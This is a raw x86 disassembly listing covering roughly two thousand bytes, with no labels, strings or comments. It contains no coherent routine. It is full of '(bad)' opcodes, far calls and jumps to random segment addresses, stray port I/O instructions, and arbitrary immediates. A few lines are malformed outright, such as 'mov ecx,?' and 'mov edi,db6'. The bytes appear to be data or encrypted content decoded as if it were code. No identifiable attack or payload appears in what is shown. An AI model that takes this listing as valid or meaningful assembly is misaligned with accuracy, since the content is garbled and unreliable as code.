  404758:	mov    ds:0xd125199a,al
  40475d:	test   eax,0x2158178c
  404762:	fcmovne st,st(1)
  404764:	push   edx
  404765:	jb     0x4046f8
  404767:	jo     0x4047dd
  404769:	xor    edx,edx
  40476b:	mov    ds:0x7b8e7bb3,al
  404770:	dec    ebp
  404771:	cld    
  404772:	mov    al,es:0x2fee4e68
  404778:	(bad)  
  404779:	and    ah,dh
  40477b:	(bad)  
  40477c:	jbe    0x4047b3
  40477e:	cmp    ebx,DWORD PTR [edx-0x4f]
  404781:	jmp    0x3a2342c
  404786:	repnz aad 0x4a
  404789:	leave  
  40478a:	(bad)  
  40478b:	xchg   ecx,eax
  40478c:	sbb    ecx,esp
  40478e:	inc    ebx
  40478f:	(bad)  [eax+ebx*8-0x54d3b91c]
  404796:	aaa    
  404797:	cs jp  0x404754
  40479a:	div    DWORD PTR [ebp-0x27]
  40479d:	push   edi
  40479e:	pusha  
  40479f:	repnz retf 0xd707
  4047a3:	ffree  st(1)
  4047a5:	jl     0x40477d
  4047a7:	mov    eax,0x6fdceb70
  4047ac:	mov    DWORD PTR [eax+ebx*8+0x17],eax
  4047b0:	xchg   edi,eax
  4047b1:	leave  
  4047b2:	xor    DWORD PTR [ebp-0x7ff1d791],0x30481e22
  4047bc:	fnsave [eax-0x57b9c11d]
  4047c2:	push   ds
  4047c3:	xchg   edx,eax
  4047c4:	dec    ebp
  4047c5:	int3   
  4047c6:	push   ss
  4047c7:	add    DWORD PTR [ebp-0x76379607],esi
  4047cd:	cld    
  4047ce:	fist   DWORD PTR [edi-0x79]
  4047d1:	jns    0x40484b
  4047d3:	jne    0x4047a4
  4047d5:	xor    eax,DWORD PTR [edi]
  4047d7:	std    
  4047d8:	xchg   DWORD PTR [ebx],esi
  4047da:	outs   dx,BYTE PTR ds:[esi]
  4047db:	addr16 ds mov esp,0x469fbe7f
  4047e2:	outs   dx,DWORD PTR ds:[esi]
  4047e3:	in     al,0x43
  4047e5:	pop    es
  4047e6:	loopne 0x404810
  4047e8:	call   0x6b6e:0x5d36586d
  4047ef:	bound  ebp,QWORD PTR [ecx+0x76]
  4047f2:	aaa    
  4047f3:	mov    eax,ds:0x21a0b2f1
  4047f8:	sbb    eax,0xb4ccc86a
  4047fd:	shl    DWORD PTR [eax+esi*2],cl
  404800:	imul   esi,DWORD PTR [esi+0x7b6713f5],0x2dea83b0
  40480a:	push   edi
  40480b:	or     DWORD PTR [esi-0xbbf0785],edi
  404811:	xchg   BYTE PTR [esi],ch
  404813:	xchg   ebx,eax
  404814:	retf   0x12c3
  404817:	push   ebx
  404818:	mov    eax,0x6cd8a610
  40481d:	pop    ecx
  40481e:	adc    ecx,DWORD PTR ds:0x9d915025
  404824:	xor    esi,ebx
  404826:	add    bh,bl
  404828:	into   
  404829:	aas    
  40482a:	mov    bl,0x1d
  40482c:	fidivr DWORD PTR [ecx]
  40482e:	adc    DWORD PTR [ebp+0x68],esi
  404831:	cmc    
  404832:	fisub  WORD PTR [ebp-0x5f]
  404835:	aas    
  404836:	cmp    BYTE PTR ds:0x721ffef0,0x87
  40483d:	ja     0x4048af
  40483f:	inc    edx
  404840:	jmp    0x381c:0xd8bafab5
  404847:	cmp    bl,BYTE PTR [ebx]
  404849:	shl    DWORD PTR [ebp-0x1e069654],1
  40484f:	mov    ch,bl
  404851:	ret    0x9bb2
  404854:	jne    0x4048b1
  404856:	(bad)  
  404857:	int    0x89
  404859:	sbb    edx,DWORD PTR [ebx+0x79]
  40485c:	ins    DWORD PTR es:[edi],dx
  40485d:	mov    DWORD PTR [ebx],0x22d8e85b
  404863:	jns    0x40486b
  404865:	cmc    
  404866:	outs   dx,DWORD PTR ds:[esi]
  404867:	jg     0x4048c8
  404869:	enter  0x88c6,0xe0
  40486d:	push   ds
  40486e:	jp     0x4048e9
  404870:	test   BYTE PTR [esi-0x4d],bh
  404873:	inc    eax
  404874:	mov    al,ds:0x3a134783
  404879:	push   esi
  40487a:	fwait
  40487b:	add    eax,0xd0f93c98
  404880:	or     al,0x57
  404882:	xchg   ecx,eax
  404883:	(bad)  
  404884:	cmp    eax,DWORD PTR [ebp-0xd55286a]
  40488a:	jbe    0x404859
  40488c:	stc    
  40488d:	mov    ecx,0x5edbb33c
  404892:	loope  0x404835
  404894:	cmp    ebp,esi
  404896:	mov    bh,0x4
  404898:	mov    ebp,0x5bb4872b
  40489d:	add    eax,DWORD PTR [edx-0x78]
  4048a0:	lahf   
  4048a1:	or     BYTE PTR [ebx-0x44dd993b],dl
  4048a7:	mov    bh,0xbc
  4048a9:	cmc    
  4048aa:	sub    eax,0xb4e48959
  4048af:	leave  
  4048b0:	sub    eax,0xf888242e
  4048b5:	jns    0x40489f
  4048b7:	(bad)  
  4048b8:	rcl    BYTE PTR [esp-0x49],1
  4048bc:	mov    ah,0x91
  4048be:	push   ebx
  4048bf:	imul   ecx,DWORD PTR [ebx],0xe66712c6
  4048c5:	inc    esp
  4048c6:	jmp    0x404938
  4048c8:	or     esp,edx
  4048ca:	inc    ecx
  4048cb:	inc    edx
  4048cc:	pop    ebx
  4048cd:	shr    BYTE PTR [esi-0x76f09010],1
  4048d3:	inc    eax
  4048d4:	pop    edx
  4048d5:	outs   dx,DWORD PTR ds:[esi]
  4048d6:	inc    esi
  4048d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d8:	enter  0xaf3b,0x6c
  4048dc:	stos   BYTE PTR es:[edi],al
  4048dd:	jne    0x4048d7
  4048df:	jge    0x404908
  4048e1:	xor    ebp,edi
  4048e3:	or     ebp,DWORD PTR [ecx]
  4048e5:	sbb    al,0xa3
  4048e7:	inc    ebp
  4048e8:	(bad)  [esi-0x49]
  4048eb:	shl    DWORD PTR [eax],0x5
  4048ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ef:	add    ebx,DWORD PTR [ebp+edx*2+0x62]
  4048f3:	lock sbb esi,DWORD PTR [edx-0x4cade438]
  4048fa:	test   al,0xee
  4048fc:	sbb    ecx,eax
  4048fe:	ja     0x4048bd
  404900:	add    eax,0x188fdf0c
  404905:	div    DWORD PTR ds:0x5d519ad
  40490b:	popf   
  40490c:	bswap  edx
  40490e:	(bad)  
  404910:	mov    ecx,?
  404912:	inc    esp
  404913:	loopne 0x404919
  404915:	shl    eax,cl
  404917:	jne    0x4048c8
  404919:	aas    
  40491a:	add    BYTE PTR [ecx-0xe],dh
  40491d:	cmp    ah,bh
  40491f:	sbb    al,0xcb
  404921:	pop    ds
  404922:	mov    edx,0xa6e68201
  404927:	or     eax,0x31e87e9f
  40492c:	or     BYTE PTR [ebp+0x0],bl
  40492f:	jno    0x40495d
  404931:	sub    BYTE PTR [edi+0x6e],ch
  404934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404935:	scas   al,BYTE PTR es:[edi]
  404936:	jmp    0x404990
  404938:	ja     0x40492b
  40493a:	imul   ecx,DWORD PTR [edx],0xc492cb23
  404940:	jecxz  0x4049bf
  404942:	mov    cs,WORD PTR [eax+0x50]
  404945:	jg     0x40492a
  404947:	push   ss
  404948:	sti    
  404949:	lea    esi,[edi-0x366c291b]
  40494f:	(bad)  
  404951:	test   DWORD PTR [edx+0x6865411c],edi
  404957:	and    DWORD PTR [ecx],eax
  404959:	popa   
  40495a:	loop   0x40493c
  40495c:	xchg   edx,eax
  40495d:	jg     0x404985
  40495f:	jp     0x4049c9
  404961:	test   al,0x3d
  404963:	stos   DWORD PTR es:[edi],eax
  404964:	fwait
  404965:	push   ss
  404966:	sbb    DWORD PTR [ebx],esp
  404968:	ret    0xef2
  40496b:	inc    esp
  40496c:	jl     0x40490f
  40496e:	mov    DWORD PTR [bp+di-0x6e],ecx
  404972:	adc    DWORD PTR [eax-0x67],0xee868b2d
  404979:	mov    WORD PTR [edx-0x75cd262a],cs
  40497f:	xchg   BYTE PTR [edx-0x29f87ec2],bl
  404985:	fnstenv [edi]
  404987:	js     0x4049bf
  404989:	cmp    dl,BYTE PTR [edi]
  40498b:	xor    esi,eax
  40498d:	cmp    ebp,DWORD PTR ds:0x4998d53f
  404993:	pop    ebp
  404994:	add    BYTE PTR [edi+eax*2],bh
  404997:	jmp    0xcac13abf
  40499c:	call   0x9bed:0x6937df30
  4049a3:	pop    eax
  4049a4:	les    edi,FWORD PTR [edx+0x43]
  4049a7:	outs   dx,DWORD PTR ds:[esi]
  4049a8:	sub    DWORD PTR [ebp+0x35],ecx
  4049ab:	fld    TBYTE PTR [edi-0x1e]
  4049ae:	and    eax,0xd42befe6
  4049b3:	sbb    esp,esp
  4049b5:	pushf  
  4049b6:	rcl    DWORD PTR [ecx+0x70b8d196],1
  4049bc:	mov    ebp,0x4f88f337
  4049c1:	clc    
  4049c2:	popf   
  4049c3:	push   ebp
  4049c4:	iret   
  4049c5:	mov    esp,0x5c2166dc
  4049ca:	daa    
  4049cb:	inc    ebp
  4049cc:	cmc    
  4049cd:	test   al,0x87
  4049cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d1:	ss dec esi
  4049d3:	outs   dx,BYTE PTR ds:[esi]
  4049d4:	jbe    0x404a04
  4049d6:	mov    al,0x25
  4049d8:	scas   al,BYTE PTR es:[edi]
  4049d9:	call   0xc234:0x1c5ed8b4
  4049e0:	and    bl,dh
  4049e2:	cmp    eax,0x10f3d356
  4049e7:	adc    DWORD PTR [edi-0x50],edi
  4049ea:	jns    0x4049af
  4049ec:	jns    0x404a68
  4049ee:	fiadd  WORD PTR [edi+ebp*4+0x53]
  4049f2:	out    dx,eax
  4049f3:	mov    esp,0x63040011
  4049f8:	pop    es
  4049f9:	(bad)  
  4049fb:	aam    0xca
  4049fd:	xlat   BYTE PTR ds:[ebx]
  4049fe:	xor    al,0x2
  404a00:	pop    edi
  404a01:	punpckldq mm0,DWORD PTR [edx-0x63]
  404a05:	stos   DWORD PTR es:[edi],eax
  404a06:	mov    DWORD PTR [esi-0x63],ebx
  404a09:	stos   DWORD PTR es:[edi],eax
  404a0a:	mov    dl,0x8f
  404a0c:	add    ebp,ebp
  404a0e:	out    dx,al
  404a0f:	loopne 0x404a60
  404a11:	cmp    ecx,DWORD PTR [ecx-0x1a9b6f88]
  404a17:	rcr    cl,1
  404a19:	jb     0x404a57
  404a1b:	cmp    dh,BYTE PTR [ebx]
  404a1d:	cli    
  404a1e:	(bad)  
  404a1f:	jnp    0x404a31
  404a21:	xor    eax,0xf22b9c62
  404a26:	adc    al,0xe1
  404a28:	or     dl,BYTE PTR ds:[ebp+0x17]
  404a2c:	adc    ecx,DWORD PTR [esi+0x687d018b]
  404a32:	add    al,0x8f
  404a34:	lds    ecx,FWORD PTR [eax+0x5b]
  404a37:	jmp    0x25ad7b22
  404a3c:	push   ebx
  404a3d:	push   ecx
  404a3e:	inc    esi
  404a3f:	inc    ecx
  404a40:	jecxz  0x404a14
  404a42:	(bad)  
  404a43:	aam    0xa
  404a45:	retf   0x9409
  404a48:	dec    edi
  404a49:	or     ecx,DWORD PTR [ebp-0x6e5de8e1]
  404a4f:	add    BYTE PTR ds:0x940714f1,al
  404a55:	test   BYTE PTR [ebx-0x29],bh
  404a58:	sbb    BYTE PTR [esi+0x2a],0x31
  404a5c:	xchg   edi,eax
  404a5d:	jge    0x404a2e
  404a5f:	arpl   dx,di
  404a61:	aad    0x88
  404a63:	fdivr  DWORD PTR [eax-0x5c85e61f]
  404a69:	mov    eax,cs
  404a6b:	inc    edi
  404a6c:	pop    edi
  404a6d:	cld    
  404a6e:	sub    DWORD PTR [ebx],ecx
  404a70:	(bad)  
  404a71:	scas   eax,DWORD PTR es:[di]
  404a73:	inc    esp
  404a74:	dec    esp
  404a75:	jge    0x404a02
  404a77:	sub    ecx,DWORD PTR [edi-0x767eb532]
  404a7d:	test   eax,0x37ba2acd
  404a83:	loope  0x404ae1
  404a85:	push   esp
  404a86:	cmc    
  404a87:	lds    eax,FWORD PTR [edi-0x5c]
  404a8a:	push   0x6ea765f7
  404a8f:	jo     0x404a71
  404a91:	sbb    edx,DWORD PTR [ebp+0x2f]
  404a94:	mov    dh,0x28
  404a96:	aam    0xc1
  404a98:	cmp    DWORD PTR [ecx],ecx
  404a9a:	xchg   cl,al
  404a9c:	bts    esp,ecx
  404a9f:	sbb    edi,ecx
  404aa1:	fld    DWORD PTR [esi-0x652d45a9]
  404aa7:	and    eax,0x30a5ea41
  404aac:	mov    al,ds:0x72c0176f
  404ab1:	pop    ss
  404ab2:	jmp    0xed3e:0xe369fc38
  404ab9:	scas   al,BYTE PTR es:[edi]
  404aba:	xchg   esi,eax
  404abb:	inc    esp
  404abc:	or     al,0x8e
  404abe:	in     al,0x99
  404ac0:	ins    DWORD PTR es:[edi],dx
  404ac1:	test   bh,cl
  404ac3:	mov    eax,0x4f8ee01e
  404ac8:	aad    0x35
  404aca:	xchg   BYTE PTR [ecx+ebp*1],bl
  404acd:	dec    esi
  404ace:	sub    BYTE PTR es:[edi],0xe1
  404ad2:	pop    es
  404ad3:	sbb    DWORD PTR [edi+0x35f28ff1],esp
  404ad9:	daa    
  404ada:	add    al,0x9c
  404adc:	push   es
  404add:	mov    al,ds:0xe3b4ef1
  404ae2:	and    DWORD PTR [edi+esi*8+0x7494d3a0],0xffffffe8
  404aea:	data16 jl 0x404a80
  404aed:	(bad)  
  404aee:	jg     0x404b2d
  404af0:	xor    BYTE PTR [ebx-0x6ecbbddf],al
  404af6:	hlt    
  404af7:	and    BYTE PTR [edi+eax*4-0x3f],0x5d
  404afc:	push   cs
  404afd:	sub    eax,0x77cad945
  404b02:	adc    ecx,edi
  404b04:	aam    0x4f
  404b06:	sub    dh,al
  404b08:	(bad)  
  404b09:	pop    edx
  404b0a:	call   0x22f7:0xa73c6e72
  404b11:	adc    DWORD PTR [edx+eiz*8],esp
  404b14:	jnp    0x404ab9
  404b16:	adc    cl,BYTE PTR [ebx]
  404b18:	loope  0x404b98
  404b1a:	mov    ebp,0xb9c8dab3
  404b1f:	mov    ecx,0x9542c50e
  404b24:	test   eax,0x956e4d23
  404b29:	mov    ebp,0x15869da4
  404b2e:	fdiv   DWORD PTR [edi+0x20]
  404b31:	cmp    ah,0x1b
  404b34:	test   BYTE PTR [edi+ecx*4-0x39],dh
  404b38:	xchg   al,ah
  404b3a:	shl    DWORD PTR [ebp-0x45],cl
  404b3d:	mov    eax,ds:0xe5940281
  404b42:	retf   0x1c8c
  404b45:	enter  0x2f2b,0x82
  404b49:	jle    0x404ace
  404b4b:	repnz mov ah,0x8d
  404b4e:	scas   al,BYTE PTR es:[edi]
  404b4f:	nop
  404b50:	mov    esi,0x36632739
  404b55:	retf   
  404b56:	cld    
  404b57:	push   ds
  404b58:	fcmove st,st(1)
  404b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b5b:	sub    eax,0xefd630cc
  404b60:	jns    0x404b43
  404b62:	dec    eax
  404b63:	ret    
  404b64:	cmp    dh,BYTE PTR [edx+0x40]
  404b67:	(bad)  [ebp+0x7c]
  404b6a:	or     BYTE PTR [eax],ch
  404b6c:	leave  
  404b6d:	dec    esp
  404b6e:	or     al,0x22
  404b70:	mov    ebx,0x968c79bf
  404b75:	test   DWORD PTR [edi+0x31],0x58d85b77
  404b7c:	ret    
  404b7d:	data16 lahf 
  404b7f:	mov    bh,0xe
  404b81:	js     0x404b8d
  404b83:	(bad)  
  404b84:	mov    DWORD PTR [ebp+0x5c],esp
  404b87:	aaa    
  404b88:	jae    0x404bf5
  404b8a:	inc    edi
  404b8b:	rcl    BYTE PTR [esi+ebx*1+0x609dfd8f],0xb9
  404b93:	jo     0x404b7e
  404b95:	jns    0x404b79
  404b97:	push   ecx
  404b98:	mov    cs,WORD PTR [ebx-0x74]
  404b9b:	mul    DWORD PTR [esi+0x49]
  404b9e:	xor    BYTE PTR [eax-0x3a],bl
  404ba1:	rcr    edx,cl
  404ba3:	sub    dl,al
  404ba5:	fnsave ds:0x375c035f
  404bab:	push   ecx
  404bac:	jmp    0x2adf:0x5ebbb2da
  404bb3:	xchg   al,ch
  404bb5:	imul   esp,DWORD PTR [edx+edx*8],0xffffff90
  404bb9:	stc    
  404bba:	ror    DWORD PTR [edx-0x713c8665],0xa4
  404bc1:	outs   dx,BYTE PTR ds:[esi]
  404bc2:	push   es
  404bc3:	adc    al,0x69
  404bc5:	cwde   
  404bc6:	inc    edx
  404bc7:	dec    ebx
  404bc8:	sub    al,BYTE PTR [edi-0x36eb8d4c]
  404bce:	gs jecxz 0x404c17
  404bd1:	shr    DWORD PTR [ebx+0x54],cl
  404bd4:	push   cs
  404bd5:	lock in eax,0xbb
  404bd8:	inc    eax
  404bd9:	sbb    BYTE PTR [ecx+0x10537462],cl
  404bdf:	pop    eax
  404be0:	xor    ah,BYTE PTR [ebx]
  404be2:	xor    DWORD PTR [edx-0x36],edi
  404be5:	fs push ebx
  404be7:	and    DWORD PTR [ecx-0x73],esp
  404bea:	push   edx
  404beb:	fist   DWORD PTR [eax+0x6d03540e]
  404bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bf2:	mov    esi,0x8442cf55
  404bf7:	sub    eax,0xefbbc5a3
  404bfc:	push   ebp
  404bfd:	sti    
  404bfe:	lahf   
  404bff:	jge    0x404c1c
  404c01:	adc    BYTE PTR [ecx],dh
  404c03:	out    0x80,eax
  404c05:	nop
  404c06:	add    BYTE PTR [ecx],ch
  404c08:	call   FWORD PTR [eax+0x4d4c511]
  404c0e:	cmc    
  404c0f:	sbb    eax,0xa4f5db3d
  404c14:	xchg   ebp,eax
  404c15:	loopne 0x404c0b
  404c17:	retf   0x4dad
  404c1a:	je     0x404c1b
  404c1c:	add    al,0xd4
  404c1e:	dec    ebx
  404c1f:	hlt    
  404c20:	mov    al,BYTE PTR [esi]
  404c22:	loop   0x404c2d
  404c24:	lea    edx,[ebp+ebx*4-0x2e]
  404c28:	pop    ds
  404c29:	dec    edx
  404c2a:	fwait
  404c2b:	call   0xb867:0x1b3c4de2
  404c32:	add    DWORD PTR [edi],0xffffffa8
  404c35:	pop    ds
  404c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c37:	fild   WORD PTR [ecx]
  404c39:	push   ecx
  404c3a:	daa    
  404c3b:	and    bx,WORD PTR [eax+ebx*1-0x76]
  404c40:	cmp    ch,bh
  404c42:	push   ebp
  404c43:	adc    dl,dh
  404c45:	inc    esi
  404c46:	imul   eax,ebp,0x98926404
  404c4c:	push   esi
  404c4d:	dec    bx
  404c4f:	ja     0x404c37
  404c51:	xchg   esp,eax
  404c52:	sbb    BYTE PTR [ebx+eax*4+0x9],cl
  404c56:	ins    BYTE PTR es:[edi],dx
  404c57:	mov    ch,0xa0
  404c59:	inc    ebp
  404c5a:	push   ebx
  404c5b:	jnp    0x404cb9
  404c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c5e:	push   edi
  404c5f:	inc    esi
  404c60:	inc    edi
  404c61:	push   eax
  404c62:	call   0x5e94:0x3521683e
  404c69:	and    bh,dh
  404c6b:	pushf  
  404c6c:	or     eax,0xc6105972
  404c71:	dec    esi
  404c72:	push   esi
  404c73:	mov    ah,0xff
  404c75:	loope  0x404cac
  404c77:	sbb    BYTE PTR [ebx+edi*2],bl
  404c7a:	test   DWORD PTR [ecx],0x1a745ac4
  404c80:	mov    eax,ds:0x96026a39
  404c85:	ja     0x404c35
  404c87:	or     BYTE PTR [edi],bl
  404c89:	and    al,0xbf
  404c8b:	repnz adc al,0xa3
  404c8e:	fstp   st(6)
  404c90:	pop    edi
  404c91:	sar    DWORD PTR [ebx-0x2e],0xd6
  404c95:	inc    BYTE PTR [ecx+0x63c2568]
  404c9b:	fcmovne st,st(5)
  404c9d:	push   cs
  404c9e:	ret    
  404c9f:	cli    
  404ca0:	into   
  404ca1:	or     edi,DWORD PTR [edi*4+0x54a4ca3a]
  404ca8:	into   
  404ca9:	pop    edx
  404caa:	arpl   WORD PTR [esi+0x5a],sp
  404cad:	mov    al,0xd2
  404caf:	je     0x404c34
  404cb1:	pop    esp
  404cb2:	adc    bh,BYTE PTR [eax]
  404cb4:	out    0x4e,eax
  404cb6:	mov    ds,WORD PTR [edx+ebx*2-0x7a50f81f]
  404cbd:	jnp    0x404c8e
  404cbf:	out    0xb3,eax
  404cc1:	add    eax,0x16f228a5
  404cc6:	dec    edi
  404cc7:	fnstsw WORD PTR [edi+0x34]
  404cca:	mov    WORD PTR [ebx+0x9910d26],es
  404cd0:	retf   0x4e59
  404cd3:	aad    0xf2
  404cd5:	stos   DWORD PTR es:[edi],eax
  404cd6:	jle    0x404d27
  404cd8:	push   ds
  404cd9:	enter  0xc322,0x5d
  404cdd:	or     ch,BYTE PTR [esi]
  404cdf:	jmp    DWORD PTR [edi]
  404ce1:	and    ecx,DWORD PTR [edi]
  404ce3:	inc    eax
  404ce4:	retf   0xa9da
  404ce7:	dec    esi
  404ce8:	push   ebx
  404ce9:	add    BYTE PTR [eax+0x4b76c7c5],ah
  404cef:	cwde   
  404cf0:	jg     0x404cad
  404cf2:	rcr    DWORD PTR [edi-0x45],1
  404cf5:	inc    eax
  404cf6:	call   0x1483bd67
  404cfb:	sbb    ah,BYTE PTR [edx+esi*4+0x66]
  404cff:	in     al,dx
  404d00:	lock sub eax,0x5716b0fe
  404d06:	test   BYTE PTR [ecx+0x40],0x92
  404d0a:	mov    bl,0x22
  404d0c:	add    al,0x6b
  404d0e:	adc    DWORD PTR [eax-0x6f],0xd9ef2ba4
  404d15:	mov    ebx,DWORD PTR [edi-0x2b]
  404d18:	adc    al,bh
  404d1a:	sub    ecx,0x53c55f17
  404d20:	jmp    0x7d33b994
  404d25:	(bad)  
  404d27:	jmp    0x404cdd
  404d29:	dec    ebx
  404d2a:	das    
  404d2b:	mov    edi,db6
  404d2e:	push   ebp
  404d2f:	mov    ebp,0xd3f2f72d
  404d34:	int    0x51
  404d36:	push   es
  404d37:	xor    ecx,DWORD PTR [ecx]
  404d39:	arpl   WORD PTR [ebp-0x3029ae67],cx
  404d3f:	call   0x1f5b4fcf
  404d44:	es ja  0x404dc6
  404d47:	jae    0x404d54
  404d49:	xor    eax,0x7b29df36
  404d4e:	das    
  404d4f:	iret   
  404d50:	cmp    bl,BYTE PTR [edi+0x9]
  404d53:	into   
  404d54:	mov    eax,ds:0x5a5fbb08
  404d59:	and    DWORD PTR [esi-0x4a],edi
  404d5c:	inc    eax
  404d5d:	add    dh,BYTE PTR [ebp-0x77fff1d1]
  404d63:	mov    esi,0x2872e1e3
  404d68:	aaa    
  404d69:	xor    BYTE PTR [edx+0x54],al
  404d6c:	gs adc al,0x1e
  404d6f:	js     0x404cf6
  404d71:	lods   al,BYTE PTR ds:[esi]
  404d72:	stos   DWORD PTR es:[edi],eax
  404d73:	out    0x1,al
  404d75:	mov    cl,0x54
  404d77:	inc    esp
  404d78:	adc    cl,BYTE PTR [eax]
  404d7a:	cs mov ebx,0x9a82be5d
  404d80:	push   esp
  404d81:	xlat   BYTE PTR ds:[ebx]
  404d82:	jl     0x404de7
  404d84:	jl     0x404d37
  404d86:	pop    ecx
  404d87:	inc    ecx
  404d88:	js     0x404d0b
  404d8a:	jne    0x404d74
  404d8c:	mov    ds:0xe25a8a7f,eax
  404d91:	stos   DWORD PTR es:[edi],eax
  404d92:	and    esp,DWORD PTR [eax+0x79]
  404d95:	std    
  404d96:	sbb    eax,0x63f4f5a4
  404d9b:	dec    esi
  404d9c:	sbb    al,BYTE PTR [edx+esi*4+0x30]
  404da0:	(bad)  
  404da2:	adc    DWORD PTR [ecx-0x1c],0xffffffcd
  404da6:	xor    eax,0x2470901d
  404dab:	gs adc al,0xa3
  404dae:	xor    BYTE PTR [edx],0x81
  404db1:	sbb    BYTE PTR [edi-0x76e215c7],bl
  404db7:	push   ecx
  404db8:	loop   0x404d67
  404dba:	cs mov bh,0x74
  404dbd:	bound  ebx,QWORD PTR [edx]
  404dbf:	jmp    0x404dd4
  404dc1:	pop    esi
  404dc2:	add    ch,BYTE PTR [ebp+0x11]
  404dc5:	jmp    0x3a7a:0xad695dd8
  404dcc:	stc    
  404dcd:	push   ebp
  404dce:	jbe    0x404dac
  404dd0:	or     BYTE PTR [edi],0x70
  404dd3:	call   0x794a6bbc
  404dd8:	xchg   edi,eax
  404dd9:	push   esp
  404dda:	fcom   QWORD PTR [esi]
  404ddc:	into   
  404ddd:	das    
  404dde:	add    DWORD PTR es:[ecx],0x60
  404de2:	repnz adc al,0xac
  404de5:	(bad)  
  404de6:	xor    al,0x2a
  404de8:	cmp    BYTE PTR [esi+0x3d],ah
  404deb:	xchg   ebx,eax
  404dec:	call   0x606a1f38
  404df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404df2:	jmp    0xe010:0x6868b582
  404df9:	fidiv  WORD PTR [ecx-0x420243c0]
  404dff:	retf   
  404e00:	imul   ecx,DWORD PTR [edx],0x32
  404e03:	test   al,0x87
  404e05:	xor    BYTE PTR [edx-0x57f0968b],ch
  404e0b:	test   BYTE PTR [ebp+edi*2+0xc],ch
  404e0f:	add    BYTE PTR [ecx+0x13],0x52
  404e13:	push   esp
  404e14:	clc    
  404e15:	mov    ds:0x75ed724f,al
  404e1a:	jmp    DWORD PTR [edi+0x45bae398]
  404e20:	lahf   
  404e21:	mov    dh,0x7d
  404e23:	jne    0x404e50
  404e25:	dec    eax
  404e26:	hlt    
  404e27:	inc    esp
  404e28:	fwait
  404e29:	enter  0xb874,0x41
  404e2d:	ja     0x404e80
  404e2f:	and    edi,DWORD PTR [eax-0x6381c232]
  404e35:	xor    al,0x7c
  404e37:	mov    ah,0xbe
  404e39:	add    esi,DWORD PTR [edx+ebx*8+0x4067100b]
  404e40:	retf   
  404e41:	dec    eax
  404e42:	test   al,0x26
  404e44:	jno    0x404de5
  404e46:	inc    ecx
  404e47:	cld    
  404e48:	jl     0x404ec0
  404e4a:	(bad)  
  404e4b:	jne    0x404de0
  404e4d:	cmp    DWORD PTR [ebp+0x52b3351a],edi
  404e53:	call   0x9454e447
  404e58:	jae    0x404ea5
  404e5a:	cld    
  404e5b:	inc    esp
  404e5c:	mov    cl,0xa9
  404e5e:	mov    ds:0xf86c219a,al
  404e63:	aaa    
  404e64:	mov    al,ds:0x77370494
  404e69:	ja     0x404dee
  404e6b:	adc    edx,eax
  404e6d:	push   0xffffff8d
  404e6f:	xor    al,0x3d
  404e71:	out    dx,eax
  404e72:	lock or bl,BYTE PTR [edx]
  404e75:	push   edi
  404e76:	lea    edi,[ebp-0x4d]
  404e79:	fisttp QWORD PTR [edx+0x351e3bdb]
  404e7f:	inc    edi
  404e80:	arpl   bp,si
  404e82:	addr16 call 0x5661:0x59c72be5
  404e8a:	and    BYTE PTR [edx+eiz*1+0x707e9c8],cl
  404e91:	lods   eax,DWORD PTR ds:[esi]
  404e92:	mov    al,0x79
  404e94:	mov    dl,0x6
  404e96:	mov    dl,0x1e
  404e98:	jbe    0x404f16
  404e9a:	mov    al,0x4d
  404e9c:	adc    al,0xc7
  404e9e:	push   ecx
  404e9f:	ds adc esp,eax
  404ea2:	lods   eax,DWORD PTR ds:[esi]
  404ea3:	add    al,BYTE PTR [ecx]
  404ea5:	arpl   WORD PTR [ebx+ebx*1-0x61e60c65],si
  404eac:	push   ebp
  404ead:	mov    dh,BYTE PTR [eax+0x3e]
  404eb0:	dec    esi
  404eb1:	das    
  404eb2:	jg     0x404e6f
  404eb4:	out    dx,al
  404eb5:	jnp    0x404e9f
  404eb7:	retf   0xd9c9
  404eba:	pop    es
  404ebb:	inc    ebp
  404ebc:	jl     0x404f1f
  404ebe:	push   eax
  404ebf:	and    al,0x18
  404ec1:	pop    eax
  404ec2:	cmp    BYTE PTR [ebx],al
  404ec4:	inc    ebx
  404ec5:	push   ds
  404ec6:	pop    eax
  404ec7:	call   0xefe2:0x78af44dd
  404ece:	inc    esi
  404ecf:	stos   DWORD PTR es:[edi],eax
  404ed0:	test   DWORD PTR [ecx-0xf32c805],edi
  404ed6:	in     al,0xa1
  404ed8:	push   ecx
  404ed9:	and    ebx,DWORD PTR [ecx]
  404edb:	fsubrp st(2),st
  404edd:	push   edi
  404ede:	test   BYTE PTR [eax-0x7a68a010],ch
  404ee4:	or     BYTE PTR [ebx+edx*2],dl
  404ee7:	push   edx
  404ee8:	dec    edi
  404ee9:	jl     0x404ec4
  404eeb:	inc    ebp
  404eec:	(bad)  
  404eee:	push   ss
  404eef:	(bad)  
  404ef0:	mov    DWORD PTR [esp+ebp*4+0x46252937],esi
  404ef7:	std    
  404ef8:	mov    bh,0x6a
  404efa:	test   al,0x5c
  404efc:	fldcw  WORD PTR [esp+edx*2-0x5a]
  404f00:	(bad)  
  404f01:	sub    al,0xdb
  404f03:	fld    QWORD PTR [edi+0x7f]
  404f06:	and    al,0x71
  404f08:	push   cs
  404f09:	adc    al,0x26
  404f0b:	cwde   
  404f0c:	call   0x5b90fa4d
  404f11:	popf   
  404f12:	cs loopne 0x404ead
  404f15:	lds    ecx,FWORD PTR [edi]
  404f17:	or     ecx,DWORD PTR [ebx]
  404f19:	adc    eax,0x8a37f99e
  404f1e:	sbb    DWORD PTR [edx+0x1674c8dd],esp
  404f24:	sbb    BYTE PTR ds:0x6f702e3,dh
  404f2a:	leave  
  404f2b:	jle    0x404f32
  404f2d:	ins    DWORD PTR es:[edi],dx
  404f2e:	push   ecx
  404f2f:	mov    ch,0x99
  404f31:	add    al,0xf
  404f33:	fstp   QWORD PTR [edi-0x2cfd84ab]
  404f39:	ins    DWORD PTR es:[edi],dx
  404f3a:	iret   
  404f3b:	pop    es
  404f3c:	mov    dh,0x9e
  404f3e:	mov    ecx,0x784265e
  404f43:	ret    0x36ad
  404f46:	ss pusha 
  404f48:	pusha  
